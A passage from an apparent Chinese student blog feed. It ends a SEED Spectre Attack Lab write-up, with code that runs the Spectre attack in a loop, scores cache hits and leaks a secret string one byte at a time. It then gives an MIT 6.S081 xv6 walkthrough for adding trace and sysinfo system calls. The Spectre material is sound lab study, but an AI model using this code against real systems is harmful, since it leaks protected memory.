class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond)</span></span>;<br>  spectreAttack(index_beyond);<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230226134812.png"></p><p>运行两次都得到了结果，秘密信息的第一个字母是S</p><h1 id="Improve-the-Attack-Accuracy"><a href="#Improve-the-Attack-Accuracy" class="headerlink" title="Improve the Attack Accuracy"></a>Improve the Attack Accuracy</h1><p>由于缓存中的噪声的存在，我们的攻击结果有可能不准确</p><ul><li>CPU 有时会在缓存中加载额外的值，以期在以后某个时间点使用它</li><li>阈值不是很准确</li></ul><p>为了提高精准度，可以使用统计技术。其思想是创建一个大小为256的得分数组，每个可能的秘密值对应一个元素。然后我们进行多次攻击。每次，如果我们的攻击程序说 k 是秘密(这个结果可能是错误的) ，我们把1加到分数[ k ]上。在多次运行攻击之后，我们使用得分最高的值 k 作为对秘密的最终估计。这将产生比基于单次运行的估计更可靠的估计</p><p>循环1000次，每次都会有一个最大hit值对应的结果，使用了一个全局静态数组score统计这1000次循环中出现最多的结果</p><p>quiz1：</p><p>You may observe that when running the code above, the one with the highest score is very likely to be<br>scores[0]. Please figure out why, and fix the code above, so the actual secret value (which is not<br>zero) will be printed out</p><p>main中1000次for循环都会调用<code>spectreAttack(index_beyond);</code>语句，从而触发<code>s = restrictedAccess(index_beyond);</code>语句的执行，此时restrictedAccess函数的返回值将会是0，而这个0值是没有被tlb刷新的</p><p>可以直接将score[0]赋值为0</p><p>quiz2：</p><p>Line 1 seems useless, but from our experience on SEED Ubuntu 20.04, without this line, the attack<br>will not work. On the SEED Ubuntu 16.04 VM, there is no need for this line. We have not figured out<br>the exact reason yet, so if you can, your instructor will likely give you bonus points. Please run the<br>program with and without this line, and describe your observations.</p><p>注释之后再16虚拟机中运行正常</p><h1 id="Steal-the-Entire-Secret-String"><a href="#Steal-the-Entire-Secret-String" class="headerlink" title="Steal the Entire Secret String"></a>Steal the Entire Secret String</h1><p>加一层循环即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">20</span>;j++)<br>&#123;<br>  flushSideChannel();<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>; i++) scores[i]=<span class="hljs-number">0</span>; <br>  <br>  <span class="hljs-keyword">size_t</span> index_beyond = (<span class="hljs-keyword">size_t</span>)(secret - (<span class="hljs-keyword">char</span>*)buffer);<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*****\n&quot;</span>);  <span class="hljs-comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span><br>    spectreAttack(index_beyond);<br>    usleep(<span class="hljs-number">10</span>);<br>    reloadSideChannelImproved();<br>  &#125;<br><br>  <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>(scores[max] &lt; scores[i]) max = i;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Spectre%20Attack%20Lab/image/image-20230226145129259.png" alt="image-20230226145129259"></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081：Lab2 syscall System calls</title>
    <link href="/p/9fed20a3/"/>
    <url>/p/9fed20a3/</url>
    
    <content type="html"><![CDATA[<blockquote><p><del>国科大理塘丁真，电子烟专卖</del></p></blockquote><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><blockquote><p>建议听课+熟读xv6手册，并理解清楚lab要求</p></blockquote><p>先切换到syscall分支，并在sh.c中加入代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做是为了防止报递归错</p><p>这个实验要求我们添加两个系统调用，所以我们需要先搞清楚riscv架构的系统调用流程</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E6%88%AA%E5%9B%BE20230302004808.png"></p><p>用户执行trace命令 - &gt; ecall <code>&lt;SYS_trace&gt;</code>  - &gt; 触发trap - &gt; 调用sys_trace</p><p>来自用户空间的系统调用、中断、异常都可以引发trap，来自用户空间的trap的处理路径是：</p><ul><li>uservec(kernel/trampoline.S:16)</li><li>usertrap(kernel/trap.c:37)</li><li>usertrapret(kernel/trap.c:90) 返回时</li><li>userret(kernel/trampoline.S:16)</li></ul><p>详细的内容见xv6文档</p><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><p>为了添加trace系统调用，我们需要：</p><ul><li>在Makefile中添加$U/_trace，这样的话就可以编译出可执行文件，从而在用户命令行中调用trace命令</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_trace<br></code></pre></td></tr></table></figure><ul><li>将trace系统调用的原型添加到 <code>user/user.h</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">trace</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>trace的stub添加到 <code>user/usys.pl</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">entry(<span class="hljs-string">&quot;trace&quot;</span>);<br></code></pre></td></tr></table></figure><p>usys.pl文件会生成<em>usys.S</em>文件，形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/syscall.h&quot;</span></span><br>.global trace<br>trace:<br> li a7, SYS_trace<br> ecall<br> ret<br></code></pre></td></tr></table></figure><ul><li>在syscall.h中添加trace的系统调用号</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_trace  22</span><br></code></pre></td></tr></table></figure><ul><li>在syscall.c中添加</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>.....<br><br>[SYS_trace]   sys_trace,<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在proc.h的proc结构体中添加字段mask</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>在sysproc.c中添加sys_trace，照猫画虎，可以参考fork的实现。其中argint获取trace的参数，也即是mask。将当前进程的mask字段设置为要追踪的参数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> mask;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;mask) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//获取trace的参数：mask</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>myproc()-&gt;mask=mask;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>修改 fork ()(参见 kernel/proc.c) ，跟踪掩码从父进程复制到子进程</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br><br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  np-&gt;mask=p-&gt;mask;<span class="hljs-comment">//给子进程的mask赋值</span><br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>添加要索引到的系统调用名称数组</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span>  *syscall_name[] = &#123;<br>  <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;fork&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>,<br>  <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;fstat&quot;</span>, <span class="hljs-string">&quot;chdir&quot;</span>, <span class="hljs-string">&quot;dup&quot;</span>, <span class="hljs-string">&quot;getpid&quot;</span>, <span class="hljs-string">&quot;sbrk&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>,<br>  <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>,<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;trace&quot;</span>,<span class="hljs-string">&quot;sysinfo&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>修改 kernel/syscall.c 中的 syscall ()函数以打印跟踪输出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> num;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<span class="hljs-comment">//myproc()：宏，当前的进程</span><br>  <span class="hljs-comment">// trap 代码将用户寄存器保存到当前进程的 trapframe 中</span><br>  num = p-&gt;trapframe-&gt;a7;<span class="hljs-comment">//num是系统调用号</span><br>  <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;<br>    p-&gt;trapframe-&gt;a0 = syscalls[num]();<span class="hljs-comment">//a0保存返回值</span><br>    <span class="hljs-keyword">if</span>((p-&gt;mask&gt;&gt;num)&amp;<span class="hljs-number">1</span>)<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[num],p-&gt;trapframe-&gt;a0);<span class="hljs-comment">//进程id、系统调用的名称、返回值</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s: unknown sys call %d\n&quot;</span>,<br>            p-&gt;pid, p-&gt;name, num);<br>    p-&gt;trapframe-&gt;a0 = <span class="hljs-number">-1</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">$ trace 32 grep hello README</span><br><span class="hljs-comment">3: syscall read -&gt; 1023</span><br><span class="hljs-comment">3: syscall read -&gt; 966</span><br><span class="hljs-comment">3: syscall read -&gt; 70</span><br><span class="hljs-comment">3: syscall read -&gt; 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><p>In this assignment you will add a system call, <code>sysinfo</code>, that collects information about the running system. The system call takes one argument: a pointer to a <code>struct sysinfo</code> (see <code>kernel/sysinfo.h</code>). The kernel should fill out the fields of this struct: the <code>freemem</code> field should be set to the number of bytes of free memory, and the <code>nproc</code> field should be set to the number of processes whose <code>state</code> is not <code>UNUSED</code>. We provide a test program <code>sysinfotest</code>; you pass this assignment if it prints “sysinfotest: OK”.</p><p>任务：添加一个系统调用 sysinfo，它收集关于正在运行的系统的信息</p><ul><li>系统调用有一个参数: 一个指向 struct sysinfo 的指针(参见 kernel/sysinfo.h)</li><li>内核应该填充这个结构的字段:<ul><li>freemem 字段应该设置为可用内存的字节数</li><li>nproc 字段应该设置为状态不是 UNUSED 的进程数</li></ul></li></ul><p>Sysinfo 需要将一个 struct sysinfo 复制回用户空间; 请参阅 sys_fstat ()(kernel/sysfile.c)和 filestat()(kernel/file.c)以获得如何使用 copy out ()实现这一点的示例。</p><ul><li>添加$U/_sysinfotest</li><li>为了收集空闲内存量，向 kernel/kalloc.c 添加一个函数getFreeByte()</li></ul><p>这块重点是理解run、kmem结构体的实现，并知道访问资源的时候需要加锁。可以参考一下kalloc.c文件中别的函数的实现，很多地方直接套用就行</p><ul><li>kmem.freelist是空闲链表，当链表的next指针不为空时说明有一个空闲资源块，遍历次数就是页的数量</li><li>由于要求求出字节，因此需要<code>return PGSIZE*total;</code>（每页的字节数乘以total）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFreeByte</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br><br>  acquire(&amp;kmem.lock);<span class="hljs-comment">//加锁</span><br>  p=kmem.freelist;<br>  <span class="hljs-keyword">while</span>(p)<br>  &#123;<br>    total++;<br>    p=p-&gt;next;<br>  &#125;<br>  release(&amp;kmem.lock);<br>  <span class="hljs-keyword">return</span> PGSIZE*total;<span class="hljs-comment">//每页的字节数*total</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>为了收集进程数，向 kernel/proc.c 添加一个函数getProcNum()</li></ul><p>proc.c中有一个全局变量proc[NPROC]，proc[0]是第一个进程，proc[NPROC-1]是最后一个进程，直接for循环遍历即可得到所有的进程结构体的指针，然后取出该指针的state字段和UNUSED比较即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> <span class="hljs-title">proc</span>[<span class="hljs-title">NPROC</span>];</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getProcNum</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) <br>  &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state!=UNUSED)<br>      total++;<br>    release(&amp;p-&gt;lock);<br>  &#125;<br>  <span class="hljs-keyword">return</span> total;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在sysproc.c中添加函数sys_sysinfo(void)<ul><li>使用argaddr函数 从 trapframe 中以指针的形式检索第 n 个系统调用，关于argaddr函数的用法，在文件的别的函数处可以参考</li><li>声明一个sysinfo类型的结构体变量，然后使用之前写好的两个函数对它进行赋值</li><li>由于需要将一个sysinfo类型的结构体变量赋值回用户空间，因此需要使用copyout函数，注意这个函数的用法，比较难写对。一定要有<code>if(xxx) return -1 ;</code>的形式，不然的话会报错（在这里卡了很久）</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 